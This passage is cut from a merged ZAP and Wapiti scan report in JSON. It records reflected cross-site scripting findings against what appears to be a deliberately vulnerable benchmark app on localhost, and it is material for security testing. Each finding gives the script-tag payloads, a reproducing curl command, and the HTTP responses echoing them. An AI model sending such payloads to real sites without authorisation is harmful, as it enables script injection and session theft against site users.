            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-01/BenchmarkTest00811?BenchmarkTest00811=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP",
                    "Wapiti - https://localhost:8444/benchmark/xss-01/BenchmarkTest00811?username=alice&password=Letm3in_&BenchmarkTest00811=%3CScRiPt%3Ealert%28%27wbnnm5jlxr%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wbnnm5jlxr')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wbnnm5jlxr')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-01/BenchmarkTest00811?username=alice&password=Letm3in_&BenchmarkTest00811=%3CScRiPt%3Ealert%28%27wbnnm5jlxr%27%29%3C%2FsCrIpT%3E\" -e \"https://localhost:8444/benchmark/xss-01/BenchmarkTest00811.html?BenchmarkTest00811=SafeText\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest00811"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00811?BenchmarkTest00811=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP', 'method': 'GET', 'headers': {'cache-control': 'no-cache', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00811.html?BenchmarkTest00811=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00811?username=alice&password=Letm3in_&BenchmarkTest00811=%3CScRiPt%3Ealert%28%27wbnnm5jlxr%27%29%3C%2FsCrIpT%3E', 'method': 'GET', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'}, 'body': {}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '27', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:06 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>\\n'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '37', 'date': 'Sun, 31 Aug 2025 04:21:53 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('wbnnm5jlxr')</sCrIpT>\\n\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-01/BenchmarkTest00822?BenchmarkTest00822=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP",
                    "Wapiti - https://localhost:8444/benchmark/xss-01/BenchmarkTest00822?username=alice&password=Letm3in_&BenchmarkTest00822=%3CScRiPt%3Ealert%28%27wo1lmpyxb6%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wo1lmpyxb6')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wo1lmpyxb6')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-01/BenchmarkTest00822?username=alice&password=Letm3in_&BenchmarkTest00822=%3CScRiPt%3Ealert%28%27wo1lmpyxb6%27%29%3C%2FsCrIpT%3E\" -e \"https://localhost:8444/benchmark/xss-01/BenchmarkTest00822.html\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest00822"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00822?BenchmarkTest00822=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP', 'method': 'GET', 'headers': {'cache-control': 'no-cache', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00822.html?BenchmarkTest00822=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00822?username=alice&password=Letm3in_&BenchmarkTest00822=%3CScRiPt%3Ealert%28%27wo1lmpyxb6%27%29%3C%2FsCrIpT%3E', 'method': 'GET', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'}, 'body': {}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '43', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:06 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': 'Parameter value: <scrIpt>alert(1);</scRipt>'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '53', 'date': 'Sun, 31 Aug 2025 04:21:53 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"Parameter value: <ScRiPt>alert('wo1lmpyxb6')</sCrIpT>\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-02/BenchmarkTest01253?BenchmarkTest01253=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP",
                    "Wapiti - https://localhost:8444/benchmark/xss-02/BenchmarkTest01253?username=alice&password=Letm3in_&BenchmarkTest01253=%3CScRiPt%3Ealert%28%27wmj3uh6jzd%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wmj3uh6jzd')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wmj3uh6jzd')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-02/BenchmarkTest01253?username=alice&password=Letm3in_&BenchmarkTest01253=%3CScRiPt%3Ealert%28%27wmj3uh6jzd%27%29%3C%2FsCrIpT%3E\" -e \"https://localhost:8444/benchmark/xss-02/BenchmarkTest01253.html\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest01253"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-02/BenchmarkTest01253?BenchmarkTest01253=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP', 'method': 'GET', 'headers': {'cache-control': 'no-cache', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-02/BenchmarkTest01253.html?BenchmarkTest01253=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-02/BenchmarkTest01253?username=alice&password=Letm3in_&BenchmarkTest01253=%3CScRiPt%3Ealert%28%27wmj3uh6jzd%27%29%3C%2FsCrIpT%3E', 'method': 'GET', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'}, 'body': {}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '26', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:08 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '36', 'date': 'Sun, 31 Aug 2025 04:21:55 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('wmj3uh6jzd')</sCrIpT>\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-02/BenchmarkTest01258?BenchmarkTest01258=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP",
                    "Wapiti - https://localhost:8444/benchmark/xss-02/BenchmarkTest01258?username=alice&password=Letm3in_&BenchmarkTest01258=%3CScRiPt%3Ealert%28%27wkf9lmc1iw%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wkf9lmc1iw')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wkf9lmc1iw')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-02/BenchmarkTest01258?username=alice&password=Letm3in_&BenchmarkTest01258=%3CScRiPt%3Ealert%28%27wkf9lmc1iw%27%29%3C%2FsCrIpT%3E\" -e \"https://localhost:8444/benchmark/xss-02/BenchmarkTest01258.html\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest01258"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-02/BenchmarkTest01258?BenchmarkTest01258=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP', 'method': 'GET', 'headers': {'cache-control': 'no-cache', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-02/BenchmarkTest01258.html?BenchmarkTest01258=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-02/BenchmarkTest01258?username=alice&password=Letm3in_&BenchmarkTest01258=%3CScRiPt%3Ealert%28%27wkf9lmc1iw%27%29%3C%2FsCrIpT%3E', 'method': 'GET', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'}, 'body': {}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '49', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:09 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': 'Formatted like: a and <scrIpt>alert(1);</scRipt>.'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '59', 'date': 'Sun, 31 Aug 2025 04:21:55 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"Formatted like: a and <ScRiPt>alert('wkf9lmc1iw')</sCrIpT>.\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-02/BenchmarkTest01263?BenchmarkTest01263=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP",
                    "Wapiti - https://localhost:8444/benchmark/xss-02/BenchmarkTest01263?username=alice&password=Letm3in_&BenchmarkTest01263=%3CScRiPt%3Ealert%28%27w3fnv33s4l%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('w3fnv33s4l')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('w3fnv33s4l')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-02/BenchmarkTest01263?username=alice&password=Letm3in_&BenchmarkTest01263=%3CScRiPt%3Ealert%28%27w3fnv33s4l%27%29%3C%2FsCrIpT%3E\" -e \"https://localhost:8444/benchmark/xss-02/BenchmarkTest01263.html\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest01263"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-02/BenchmarkTest01263?BenchmarkTest01263=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP', 'method': 'GET', 'headers': {'cache-control': 'no-cache', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-02/BenchmarkTest01263.html?BenchmarkTest01263=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-02/BenchmarkTest01263?username=alice&password=Letm3in_&BenchmarkTest01263=%3CScRiPt%3Ealert%28%27w3fnv33s4l%27%29%3C%2FsCrIpT%3E', 'method': 'GET', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'}, 'body': {}}"
          ],
          "webResponse": [
